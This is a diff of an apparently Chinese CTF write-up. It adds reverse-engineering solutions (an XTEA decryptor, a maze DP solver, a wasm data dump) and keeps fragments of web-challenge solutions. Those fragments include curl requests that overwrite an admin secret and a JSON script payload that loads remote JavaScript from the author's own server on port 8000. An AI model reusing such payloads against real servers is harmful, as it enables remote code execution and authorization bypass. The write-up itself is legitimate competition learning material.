@@ -8,6 +8,293 @@ tags:
   - CTF
   - WriteUp
 ---
+# Reverse
+
+`Reverse` 部分有些题目赛时的做法比较粗暴 赛后复盘在出题人放出源码后在blog继续更新
+
+## signin
+
+```c
+*(_DWORD *)&s[strlen(s)] = 5526852;
+strcpy(&s[strlen(s)], "CTF{");
+*(_DWORD *)&s[strlen(s)] = 7746418;
+strcpy(&s[strlen(s)], "3R53_");
+*(_DWORD *)&s[strlen(s)] = 6235185;
+strcpy(&s[strlen(s)], "\\/");
+strcpy(&s[strlen(s)], "3ry_");
+strcpy(&s[strlen(s)], "f(_)");
+strcpy(&s[strlen(s)], "n&ea");
+*(_DWORD *)&s[strlen(s)] = 2193717;
+*(_WORD *)&s[strlen(s)] = 125;
+```
+
+`DUTCTF{r3v3R53_1$_\/3ry_f(_)n&ea5y!}`断个点就行
+
+![1746087685976](image/dlut2025_5_1/1746087685976.png)
+
+使用 `WSL2`来调试
+
+运行安装目录的 `IDA\dbgsrv\linux_server64` 然后选 `Remote Linux debugger`
+
+## weather?
+
+**赛时**:
+
+![1746088082163](image/dlut2025_5_1/1746088082163.png)
+
+读入之后打个断点走两步就拿到了
+
+## tulip
+
+看题目描述就知道是花指令了
+
+**赛时**:
+
+找到了花指令 `jnz jz` `Call $+5` 但只处理了一半 想着花指令能骗过IDA骗不过AI 然后拿到了伪代码
+
+`TEA`直接解就行
+
+```c
+#include <stdint.h>
+#include <iostream>
+void decrypt_chunk_modified_xtea(uint32_t v[2], const uint32_t k[4])
+{
+    uint32_t v0 = v[0], v1 = v[1];
+    const uint32_t delta = 0x114514; // The custom delta found
+    uint32_t sum = delta * 32;       // Start sum for 32 rounds of decryption
+
+    for (int i = 0; i < 32; ++i)
+    { // 32 rounds
+        // Undo the update to v1 first
+        v1 -= (((v0 << 4) + k[2]) ^ (v0 + sum) ^ ((v0 >> 5) + k[3]));
+
+        // Undo the update to v0 second
+        v0 -= (((v1 << 4) + k[0]) ^ (v1 + sum) ^ ((v1 >> 5) + k[1]));
+
+        sum -= delta; // Decrement sum for decryption
+    }
+    v[0] = v0;
+    v[1] = v1;
+}
+
+int main()
+{
+    // The Key (data1 from sub_5C4F90)
+    uint32_t key[4] = {0x11223344, 0x55667788, 0x99AABBCC, 0xDDEEFF11};
+
+    // The Encrypted Data we want to decrypt (key_data from sub_5C4F90 - first 48 bytes)
+    uint32_t encrypted_data[12] = {
+        0x329E0EAF, 0x6A398361, // Chunk 0
+        0x320B21FA, 0x2200B7F1, // Chunk 1
+        0x2E086774, 0x74EAEF36, // Chunk 2
+        0xE8EF0A23, 0xAFD4AC64, // Chunk 3
+        0x92F93A03, 0xB37A9BFF, // Chunk 4
+        0x3CED126C, 0xF5E00531  // Chunk 5
+    };
+
+    // Buffer to hold the decrypted flag (48 bytes / 6 chunks)
+    uint32_t decrypted_flag[12];
+
+    // Decrypt each 8-byte (2 * uint32_t) chunk
+    for (int i = 0; i < 6; ++i)
+    {
+        uint32_t chunk[2];
+        chunk[0] = encrypted_data[i * 2];
+        chunk[1] = encrypted_data[i * 2 + 1];
+
+        decrypt_chunk_modified_xtea(chunk, key);
+
+        decrypted_flag[i * 2] = chunk[0];
+        decrypted_flag[i * 2 + 1] = chunk[1];
+    }
+
+    // Print the decrypted flag as characters
+    char *flag_bytes = (char *)decrypted_flag;
+    std::cout << "Potential Flag (first 48 bytes): ";
+    for (int i = 0; i < 48; ++i)
+    {
+        // Only print printable ASCII characters, represent others as '.'
+        if (flag_bytes[i] >= 32 && flag_bytes[i] <= 126)
+        {
+            std::cout << flag_bytes[i];
+        }
+        else
+        {
+            std::cout << '.'; // Use '.' for non-printable bytes
+        }
+    }
+    std::cout << std::endl;
+
+    return 0;
+}
+```
+
+## MAZE
+
+经典迷宫DP
+
+**赛时**:
+
+![1746088839840](image/dlut2025_5_1/1746088839840.png)
+
+实在找不对种子，直接把地图搞下来了
+
+```python
+import sys
+
+# 设置一个表示负无穷的值，用于不可达状态和比较
+NEG_INF = -1e18  # 使用一个足够小的数
+
+
+def solve():
+    # --- 读取地图数据 ---
+    try:
+        with open("output/map.txt", "r") as f:
+            # 读取地图大小 (如果 C++ 代码写入了的话)
+            # MAZE_HEIGHT, MAZE_WIDTH = map(int, f.readline().split()) # 可选
+            map_lines = f.readlines()
+    except FileNotFoundError:
+        print("Error: map.txt not found. Please run the C++ map generator first.")
+        sys.exit(1)
+
+    # --- 解析地图数据 ---
+    # 我们假设地图 Y 范围是 1 到 50， X 范围是 1 到 60
+    MAZE_HEIGHT = 50
+    MAZE_WIDTH = 60
+    maze_data = [[0] * (MAZE_WIDTH + 1) for _ in range(MAZE_HEIGHT + 1)]
+    for y_idx, line in enumerate(map_lines):
+        y = y_idx + 1  # 行号对应 y 坐标 (1 到 50)
+        if y > MAZE_HEIGHT:
+            break
+        values = list(map(int, line.split()))
+        for x_idx, val in enumerate(values):
+            x = x_idx + 1  # 列号对应 x 坐标 (1 到 60)
+            if x > MAZE_WIDTH:
+                break
+            maze_data[y][x] = val
+
+    # --- 动态规划 ---
+    # dp[y][x]: 到达 (x, y) 的最大分数
+    # prev_move[y][x]: 到达 (x, y) 的最优路径的上一步 ('A', 'B', 'C')
+    # 维度：y 从 0 到 50, x 从 0 到 60 (使用 0 作为边界/哨兵)
+    dp = [[NEG_INF] * (MAZE_WIDTH + 1) for _ in range(MAZE_HEIGHT + 1)]
+    prev_move = [[''] * (MAZE_WIDTH + 1) for _ in range(MAZE_HEIGHT + 1)]
+
+    # 初始状态
+    initial_score = 0  # 我们确定的初始分数
+    dp[1][1] = initial_score
+
+    # 迭代计算 DP
+    # y 代表当前步数所在的行 (从 2 到 50)
+    for y in range(2, MAZE_HEIGHT + 1):
+        # x 代表当前步数到达的列
+        for x in range(1, MAZE_WIDTH + 1):  # x 从 1 开始
+            current_cell_value = maze_data[y][x]
+            best_prev_score = NEG_INF
+            move = ''
+
+            # 检查从上方 'C' (x, y-1) 转移
+            if x >= 1 and dp[y-1][x] > NEG_INF:
+                score = dp[y-1][x]
+                if score > best_prev_score:
+                    best_prev_score = score
+                    move = 'C'
+
+            # 检查从左上方 'B' (x-1, y-1) 转移
+            if x - 1 >= 1 and dp[y-1][x-1] > NEG_INF:
+                score = dp[y-1][x-1]
+                if score > best_prev_score:
+                    best_prev_score = score
+                    move = 'B'
+
+            # 检查从右上方 'A' (x+1, y-1) 转移
+            if x + 1 <= MAZE_WIDTH and dp[y-1][x+1] > NEG_INF:
+                score = dp[y-1][x+1]
+                if score > best_prev_score:
+                    best_prev_score = score
+                    move = 'A'
+
+            # 如果存在有效的上一步，更新 dp 表和 prev_move 表
+            if move:  # 等价于 best_prev_score > NEG_INF
+                dp[y][x] = best_prev_score + current_cell_value
+                prev_move[y][x] = move
+
+    # --- 找到最大分数和终点 ---
+    final_y = MAZE_HEIGHT
+    max_score = NEG_INF
+    final_x = -1
+
+    for x in range(1, MAZE_WIDTH + 1):
+        if dp[final_y][x] > max_score:
+            max_score = dp[final_y][x]
+            final_x = x
+
+    if final_x == -1:
+        print("Error: Could not find a valid path to the end.")
+        sys.exit(1)
+
+    print(f"Maximum score found: {max_score}")
+    print(f"Ending position: (x={final_x}, y={final_y})")
+
+    # --- 回溯路径 ---
+    path = []
+    curr_x = final_x
+    curr_y = final_y
+
+    # 总共 49 步，对应 y 从 50 回溯到 2
+    for y in range(curr_y, 1, -1):
+        move = prev_move[y][curr_x]
+        path.append(move)
+        # 根据 move 更新上一步的 x 坐标
+        if move == 'A':
+            curr_x += 1
+        elif move == 'B':
+            curr_x -= 1
+        # elif move == 'C': # x 不变
+        #     pass
+
+    # 路径是反的，需要逆序
+    path.reverse()
+    final_path = "".join(path)
+
+    # --- 输出结果 ---
+    print(f"Path length: {len(final_path)}")
+    print(f"Path: {final_path}")
+    print(f"Flag format: DUTCTF{{{final_path}}}")  # 假设 Flag 格式
+
+
+if __name__ == "__main__":
+    solve()
+
+```
+
+## WoAiShiinaMahiru
+
+`wasm2c` 反编译
+
+```c
+static const u8 data_segment_data_w2c_input_d0[] = {
+  0x52, 0x46, 0x56, 0x55, 0x51, 0x31, 0x52, 0x47, 0x65, 0x7a, 0x59, 0x34, 
+  0x4d, 0x47, 0x52, 0x6a, 0x4e, 0x54, 0x55, 0x78, 0x4c, 0x54, 0x49, 0x31, 
+  0x4f, 0x44, 0x51, 0x74, 0x4f, 0x44, 0x41, 0x77, 0x5a, 0x53, 0x31, 0x69, 
+  0x4f, 0x47, 0x4a, 0x6d, 0x4c, 0x57, 0x51, 0x7a, 0x59, 0x7a, 0x4d, 0x35, 
+  0x4d, 0x7a, 0x52, 0x6b, 0x4f, 0x54, 0x64, 0x6c, 0x4f, 0x48, 0x30, 0x3d, 
+  0x00, 0x00, 0x00, 0x00, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 
+  0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 
+  0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 
+  0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 
+  0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x30, 0x31, 0x32, 0x33, 
+  0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x2b, 0x2f, 0x00, 0x2d, 0x2b, 0x20, 
+  0x20, 0x20, 0x30, 0x58, 0x30, 0x78, 0x00, 0x28, 0x6e, 0x75, 0x6c, 0x6c, 
+  0x29, 0x00, 0x49, 0x6e, 0x70, 0x75, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 
+  0x3a, 0x20, 0x00, 0x4e, 0x6f, 0x74, 0x20, 0x67, 0x6f, 0x6f, 0x64, 0x2e, 
+  0x20, 0x00, 0x4e, 0x69, 0x63, 0x65, 0x21, 0x20, 0x00, 0x0a, 0x00, 0x00, 
+  0xa0, 0x06, 
+};
+```
+
+![1746089551838](image/dlut2025_5_1/1746089551838.png)
+
 # Misc
 
 ## Signin
@@ -34,7 +321,7 @@ tags:
 豊島区目白三丁目 (Toshima-ku Mejiro San-chōme)给我具体经纬度
 ```
 
-[google地图](https://www.google.com/maps/@35.7204533,139.7130719,3a,75y,353.8h,91.22t/data=!3m7!1e1!3m5!1sXsk9Ia4QsuXgbWyH5aVmMQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D-1.2232476107826642%26panoid%3DXsk9Ia4QsuXgbWyH5aVmMQ%26yaw%3D353.79558674265166!7i16384!8i8192!5m1!1e2?entry=ttu&g_ep=EgoyMDI1MDQyOC4wIKXMDSoJLDEwMjExNDUzSAFQAw%3D%3D)
+[google街景](https://www.google.com/maps/@35.7204533,139.7130719,3a,75y,353.8h,91.22t/data=!3m7!1e1!3m5!1sXsk9Ia4QsuXgbWyH5aVmMQ!2e0!6shttps:%2F%2Fstreetviewpixels-pa.googleapis.com%2Fv1%2Fthumbnail%3Fcb_client%3Dmaps_sv.tactile%26w%3D900%26h%3D600%26pitch%3D-1.2232476107826642%26panoid%3DXsk9Ia4QsuXgbWyH5aVmMQ%26yaw%3D353.79558674265166!7i16384!8i8192!5m1!1e2?entry=ttu&g_ep=EgoyMDI1MDQyOC4wIKXMDSoJLDEwMjExNDUzSAFQAw%3D%3D)
 
 邮编数字部分 `1710032`
 
@@ -121,7 +408,7 @@ io.interactive()
 
 ## kernel_master
 
-解压一下就拿到了`flag{test}`
+解压一下就拿到了 `flag{test}`
 
 本题不会做 纯误判
 
@@ -136,6 +423,7 @@ curl -X POST http://210.30.97.133:10079/validate \
 
 curl http://210.30.97.133:10079/admin?secret=hack
 ```
+
 逻辑漏洞 覆盖 `adminSecret`
 
 ## Editor
@@ -146,7 +434,8 @@ curl http://210.30.97.133:10079/admin?secret=hack
     "script": "var a=new java.beans.Customizer{setObject:load};a.object=\"http://my_server:8000/payload.js\""
 }
 ```
-写到这里突然发现服务器`8000`端口当时做完忘了关 被扫爆了
+
+写到这里突然发现服务器 `8000`端口当时做完忘了关 被扫爆了
 
 求求佬帮看看有没有敏感数据 整个用户文件夹全被扫了
 
@@ -467,7 +756,6 @@ else:
 conn.close()
 log.info("Connection closed.")
 ```
-
 
 ## signature2
 
@@ -858,5 +1146,3 @@ except UnicodeDecodeError:
     print("Hex representation of result:")
     print(binascii.hexlify(result_bytes).decode('utf-8'))
 ```
-
-
